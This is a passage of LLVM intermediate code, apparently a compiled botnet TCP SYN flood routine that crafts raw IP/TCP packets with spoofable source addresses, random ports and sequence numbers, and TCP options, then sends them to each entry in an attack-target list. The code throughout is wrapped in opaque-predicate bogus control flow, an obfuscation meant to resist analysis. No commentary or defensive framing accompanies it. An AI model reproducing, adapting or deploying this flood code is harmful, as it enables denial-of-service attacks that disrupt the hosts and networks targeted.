  store i32 0, i32* %9, align 4
  %116 = load i32, i32* @x.21
  %117 = load i32, i32* @y.22
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %124

; <label>:124:                                    ; preds = %317, %originalBBpart2
  %125 = load i32, i32* @x.21
  %126 = load i32, i32* @y.22
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %124
  %133 = load i32, i32* %9, align 4
  %134 = load i8, i8* %5, align 1
  %135 = zext i8 %134 to i32
  %136 = icmp slt i32 %133, %135
  %137 = load i32, i32* @x.21
  %138 = load i32, i32* @y.22
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %136, label %145, label %320

; <label>:145:                                    ; preds = %originalBBpart24
  %146 = call noalias i8* @calloc(i64 128, i64 1) #6
  %147 = load i8**, i8*** %11, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i8*, i8** %147, i64 %149
  store i8* %146, i8** %150, align 8
  %151 = load i8**, i8*** %11, align 8
  %152 = load i32, i32* %9, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8*, i8** %151, i64 %153
  %155 = load i8*, i8** %154, align 8
  %156 = bitcast i8* %155 to %struct.iphdr*
  store %struct.iphdr* %156, %struct.iphdr** %27, align 8
  %157 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i64 1
  %159 = bitcast %struct.iphdr* %158 to %struct.tcphdr*
  store %struct.tcphdr* %159, %struct.tcphdr** %28, align 8
  %160 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %161 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %160, i64 1
  %162 = bitcast %struct.tcphdr* %161 to i8*
  store i8* %162, i8** %29, align 8
  %163 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %164 = bitcast %struct.iphdr* %163 to i8*
  %165 = load i8, i8* %164, align 4
  %166 = and i8 %165, 15
  %167 = or i8 %166, 64
  store i8 %167, i8* %164, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = and i8 %170, -16
  %172 = or i8 %171, 5
  store i8 %172, i8* %169, align 4
  %173 = load i8, i8* %12, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 1
  store i8 %173, i8* %175, align 1
  %176 = call zeroext i16 @htons(i16 zeroext 60) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 2
  store i16 %176, i16* %178, align 2
  %179 = load i16, i16* %13, align 2
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i8, i8* %14, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 %183, i8* %185, align 4
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %145
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %145
  %193 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 6
  store i8 6, i8* %194, align 1
  %195 = load i32, i32* %26, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 8
  store i32 %195, i32* %197, align 4
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 1
  %203 = load i32, i32* %202, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 9
  store i32 %203, i32* %205, align 4
  %206 = load i16, i16* %16, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  store i16 %207, i16* %209, align 4
  %210 = load i16, i16* %17, align 2
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 1
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* %18, align 4
  %215 = trunc i32 %214 to i16
  %216 = call zeroext i16 @htons(i16 zeroext %215) #7
  %217 = zext i16 %216 to i32
  %218 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 2
  store i32 %217, i32* %219, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %222, -241
  %224 = or i16 %223, 160
  store i16 %224, i16* %221, align 4
  %225 = load i8, i8* %20, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 13
  %232 = and i16 %229, -8193
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %21, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 12
  %241 = and i16 %238, -4097
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %22, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 11
  %250 = and i16 %247, -2049
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %23, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 10
  %259 = and i16 %256, -1025
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = load i8, i8* %24, align 1
  %262 = sext i8 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 4
  %265 = load i16, i16* %264, align 4
  %266 = and i16 %262, 1
  %267 = shl i16 %266, 9
  %268 = and i16 %265, -513
  %269 = or i16 %268, %267
  store i16 %269, i16* %264, align 4
  %270 = load i8, i8* %25, align 1
  %271 = sext i8 %270 to i16
  %272 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %273 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %271, 1
  %276 = shl i16 %275, 8
  %277 = and i16 %274, -257
  %278 = or i16 %277, %276
  store i16 %278, i16* %273, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 2, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 4, i8* %281, align 1
  %283 = call i32 @rand_next()
  %284 = and i32 %283, 15
  %285 = add i32 1400, %284
  %286 = trunc i32 %285 to i16
  %287 = call zeroext i16 @htons(i16 zeroext %286) #7
  %288 = load i8*, i8** %29, align 8
  %289 = bitcast i8* %288 to i16*
  store i16 %287, i16* %289, align 2
  %290 = load i8*, i8** %29, align 8
  %291 = getelementptr inbounds i8, i8* %290, i64 2
  store i8* %291, i8** %29, align 8
  %292 = load i8*, i8** %29, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %29, align 8
  store i8 4, i8* %292, align 1
  %294 = load i8*, i8** %29, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %29, align 8
  store i8 2, i8* %294, align 1
  %296 = load i8*, i8** %29, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %29, align 8
  store i8 8, i8* %296, align 1
  %298 = load i8*, i8** %29, align 8
  %299 = getelementptr inbounds i8, i8* %298, i32 1
  store i8* %299, i8** %29, align 8
  store i8 10, i8* %298, align 1
  %300 = call i32 @rand_next()
  %301 = load i8*, i8** %29, align 8
  %302 = bitcast i8* %301 to i32*
  store i32 %300, i32* %302, align 4
  %303 = load i8*, i8** %29, align 8
  %304 = getelementptr inbounds i8, i8* %303, i64 4
  store i8* %304, i8** %29, align 8
  %305 = load i8*, i8** %29, align 8
  %306 = bitcast i8* %305 to i32*
  store i32 0, i32* %306, align 4
  %307 = load i8*, i8** %29, align 8
  %308 = getelementptr inbounds i8, i8* %307, i64 4
  store i8* %308, i8** %29, align 8
  %309 = load i8*, i8** %29, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %29, align 8
  store i8 1, i8* %309, align 1
  %311 = load i8*, i8** %29, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %29, align 8
  store i8 3, i8* %311, align 1
  %313 = load i8*, i8** %29, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %29, align 8
  store i8 3, i8* %313, align 1
  %315 = load i8*, i8** %29, align 8
  %316 = getelementptr inbounds i8, i8* %315, i32 1
  store i8* %316, i8** %29, align 8
  store i8 6, i8* %315, align 1
  br label %317

; <label>:317:                                    ; preds = %192
  %318 = load i32, i32* %9, align 4
  %319 = add nsw i32 %318, 1
  store i32 %319, i32* %9, align 4
  br label %124

; <label>:320:                                    ; preds = %originalBBpart24
  br label %321

; <label>:321:                                    ; preds = %564, %320
  %322 = load i32, i32* @x.21
  %323 = load i32, i32* @y.22
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %321
  store i32 0, i32* %9, align 4
  %330 = load i32, i32* @x.21
  %331 = load i32, i32* @y.22
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %338

; <label>:338:                                    ; preds = %originalBBpart248, %originalBBpart28
  %339 = load i32, i32* %9, align 4
  %340 = load i8, i8* %5, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp slt i32 %339, %341
  br i1 %342, label %343, label %564

; <label>:343:                                    ; preds = %338
  %344 = load i8**, i8*** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds i8*, i8** %344, i64 %346
  %348 = load i8*, i8** %347, align 8
  store i8* %348, i8** %30, align 8
  %349 = load i8*, i8** %30, align 8
  %350 = bitcast i8* %349 to %struct.iphdr*
  store %struct.iphdr* %350, %struct.iphdr** %31, align 8
  %351 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %352 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %351, i64 1
  %353 = bitcast %struct.iphdr* %352 to %struct.tcphdr*
  store %struct.tcphdr* %353, %struct.tcphdr** %32, align 8
  %354 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %355 = load i32, i32* %9, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %354, i64 %356
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i32 0, i32 2
  %359 = load i8, i8* %358, align 4
  %360 = zext i8 %359 to i32
  %361 = icmp slt i32 %360, 32
  br i1 %361, label %362, label %399

; <label>:362:                                    ; preds = %343
  %363 = load i32, i32* @x.21
  %364 = load i32, i32* @y.22
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %362
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 1
  %376 = load i32, i32* %375, align 4
  %377 = call i32 @ntohl(i32 %376) #7
  %378 = call i32 @rand_next()
  %379 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %380 = load i32, i32* %9, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i64 %381
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i32 0, i32 2
  %384 = load i8, i8* %383, align 4
  %385 = zext i8 %384 to i32
  %386 = lshr i32 %378, %385
  %387 = add i32 %377, %386
  %388 = call i32 @htonl(i32 %387) #7
  %389 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 9
  store i32 %388, i32* %390, align 4
  %391 = load i32, i32* @x.21
  %392 = load i32, i32* @y.22
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart227, label %originalBB10alteredBB

originalBBpart227:                                ; preds = %originalBB10
  br label %399

; <label>:399:                                    ; preds = %originalBBpart227, %343
  %400 = load i32, i32* @x.21
  %401 = load i32, i32* @y.22
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %399
  %408 = load i32, i32* %26, align 4
  %409 = icmp eq i32 %408, -1
  %410 = load i32, i32* @x.21
  %411 = load i32, i32* @y.22
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %409, label %418, label %438

; <label>:418:                                    ; preds = %originalBBpart231
  %419 = load i32, i32* @x.21
  %420 = load i32, i32* @y.22
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %418
  %427 = call i32 @rand_next()
  %428 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 8
  store i32 %427, i32* %429, align 4
  %430 = load i32, i32* @x.21
  %431 = load i32, i32* @y.22
  %432 = sub i32 %430, 1
  %433 = mul i32 %430, %432
  %434 = urem i32 %433, 2
  %435 = icmp eq i32 %434, 0
  %436 = icmp slt i32 %431, 10
  %437 = or i1 %435, %436
  br i1 %437, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %438

; <label>:438:                                    ; preds = %originalBBpart235, %originalBBpart231
  %439 = load i16, i16* %13, align 2
  %440 = zext i16 %439 to i32
  %441 = icmp eq i32 %440, 65535
  br i1 %441, label %442, label %448

; <label>:442:                                    ; preds = %438
  %443 = call i32 @rand_next()
  %444 = and i32 %443, 65535
  %445 = trunc i32 %444 to i16
  %446 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %447 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %446, i32 0, i32 3
  store i16 %445, i16* %447, align 4
  br label %448

; <label>:448:                                    ; preds = %442, %438
  %449 = load i16, i16* %16, align 2
  %450 = zext i16 %449 to i32
  %451 = icmp eq i32 %450, 65535
  br i1 %451, label %452, label %458

; <label>:452:                                    ; preds = %448
  %453 = call i32 @rand_next()
  %454 = and i32 %453, 65535
  %455 = trunc i32 %454 to i16
  %456 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 0
  store i16 %455, i16* %457, align 4
  br label %458

; <label>:458:                                    ; preds = %452, %448
  %459 = load i16, i16* %17, align 2
  %460 = zext i16 %459 to i32
  %461 = icmp eq i32 %460, 65535
  br i1 %461, label %462, label %468

; <label>:462:                                    ; preds = %458
  %463 = call i32 @rand_next()
  %464 = and i32 %463, 65535
  %465 = trunc i32 %464 to i16
  %466 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 1
  store i16 %465, i16* %467, align 2
  br label %468

; <label>:468:                                    ; preds = %462, %458
  %469 = load i32, i32* @x.21
  %470 = load i32, i32* @y.22
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %468
  %477 = load i32, i32* %18, align 4
  %478 = icmp eq i32 %477, 65535
  %479 = load i32, i32* @x.21
  %480 = load i32, i32* @y.22
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %478, label %487, label %491

; <label>:487:                                    ; preds = %originalBBpart239
  %488 = call i32 @rand_next()
  %489 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 2
  store i32 %488, i32* %490, align 4
  br label %491

; <label>:491:                                    ; preds = %487, %originalBBpart239
  %492 = load i32, i32* %19, align 4
  %493 = icmp eq i32 %492, 65535
  br i1 %493, label %494, label %498

; <label>:494:                                    ; preds = %491
  %495 = call i32 @rand_next()
  %496 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 3
  store i32 %495, i32* %497, align 4
  br label %498

; <label>:498:                                    ; preds = %494, %491
  %499 = load i8, i8* %20, align 1
  %500 = icmp ne i8 %499, 0
  br i1 %500, label %501, label %507

; <label>:501:                                    ; preds = %498
  %502 = call i32 @rand_next()
  %503 = and i32 %502, 65535
  %504 = trunc i32 %503 to i16
  %505 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %506 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %505, i32 0, i32 7
  store i16 %504, i16* %506, align 2
  br label %507

; <label>:507:                                    ; preds = %501, %498
  %508 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 7
  store i16 0, i16* %509, align 2
  %510 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %511 = bitcast %struct.iphdr* %510 to i16*
  %512 = call zeroext i16 @checksum_generic(i16* %511, i32 20)
  %513 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %514 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %513, i32 0, i32 7
  store i16 %512, i16* %514, align 2
  %515 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %516 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %515, i32 0, i32 6
  store i16 0, i16* %516, align 4
  %517 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %518 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %519 = bitcast %struct.tcphdr* %518 to i8*
  %520 = call zeroext i16 @htons(i16 zeroext 40) #7
  %521 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %517, i8* %519, i16 zeroext %520, i32 40)
  %522 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 6
  store i16 %521, i16* %523, align 4
  %524 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %525 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %524, i32 0, i32 1
  %526 = load i16, i16* %525, align 2
  %527 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %528 = load i32, i32* %9, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i64 %529
  %531 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %530, i32 0, i32 0
  %532 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %531, i32 0, i32 1
  store i16 %526, i16* %532, align 2
  %533 = load i32, i32* %10, align 4
  %534 = load i8*, i8** %30, align 8
  %535 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %536 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %537 = load i32, i32* %9, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %536, i64 %538
  %540 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %539, i32 0, i32 0
  %541 = bitcast %struct.sockaddr_in* %540 to %struct.sockaddr*
  store %struct.sockaddr* %541, %struct.sockaddr** %535, align 8
  %542 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %543 = load %struct.sockaddr*, %struct.sockaddr** %542, align 8
  %544 = call i64 @sendto(i32 %533, i8* %534, i64 60, i32 16384, %struct.sockaddr* %543, i32 16)
  br label %545

; <label>:545:                                    ; preds = %507
  %546 = load i32, i32* @x.21
  %547 = load i32, i32* @y.22
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %545
  %554 = load i32, i32* %9, align 4
  %555 = add nsw i32 %554, 1
  store i32 %555, i32* %9, align 4
  %556 = load i32, i32* @x.21
  %557 = load i32, i32* @y.22
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBBpart248, label %originalBB41alteredBB

originalBBpart248:                                ; preds = %originalBB41
  br label %338

; <label>:564:                                    ; preds = %338
  br label %321

; <label>:565:                                    ; preds = %104, %98
  %566 = load i32, i32* @x.21
  %567 = load i32, i32* @y.22
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %565
  %574 = load i32, i32* @x.21
  %575 = load i32, i32* @y.22
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %107
  store i32 0, i32* %9, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %124
  %582 = load i32, i32* %9, align 4
  %583 = load i8, i8* %5, align 1
  %584 = zext i8 %583 to i32
  %585 = icmp slt i32 %582, %584
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %321
  store i32 0, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %362
  %586 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %587 = load i32, i32* %9, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %586, i64 %588
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %589, i32 0, i32 1
  %591 = load i32, i32* %590, align 4
  %592 = call i32 @ntohl(i32 %591) #7
  %593 = call i32 @rand_next()
  %594 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %595 = load i32, i32* %9, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %594, i64 %596
  %598 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %597, i32 0, i32 2
  %599 = load i8, i8* %598, align 4
  %600 = zext i8 %599 to i32
  %_ = sub i32 %593, %600
  %gen = mul i32 %_, %600
  %_11 = sub i32 0, %593
  %gen12 = add i32 %_11, %600
  %_13 = sub i32 %593, %600
  %gen14 = mul i32 %_13, %600
  %_15 = shl i32 %593, %600
  %_16 = sub i32 0, %593
  %gen17 = add i32 %_16, %600
  %601 = lshr i32 %593, %600
  %_18 = sub i32 %592, %601
  %gen19 = mul i32 %_18, %601
  %_20 = shl i32 %592, %601
  %_21 = sub i32 0, %592
  %gen22 = add i32 %_21, %601
  %_23 = sub i32 %592, %601
  %gen24 = mul i32 %_23, %601
  %602 = add i32 %592, %601
  %603 = call i32 @htonl(i32 %602) #7
  %604 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %605 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %604, i32 0, i32 9
  store i32 %603, i32* %605, align 4
  br label %originalBB10

originalBB29alteredBB:                            ; preds = %originalBB29, %399
  %606 = load i32, i32* %26, align 4
  %607 = icmp eq i32 %606, -1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %418
  %608 = call i32 @rand_next()
  %609 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %610 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %609, i32 0, i32 8
  store i32 %608, i32* %610, align 4
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %468
  %611 = load i32, i32* %18, align 4
  %612 = icmp eq i32 %611, 65535
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %545
  %613 = load i32, i32* %9, align 4
  %_42 = shl i32 %613, 1
  %_43 = sub i32 %613, 1
  %gen44 = mul i32 %_43, 1
  %_45 = sub i32 %613, 1
  %gen46 = mul i32 %_45, 1
  %614 = add nsw i32 %613, 1
  store i32 %614, i32* %9, align 4
  br label %originalBB41

originalBB50alteredBB:                            ; preds = %originalBB50, %565
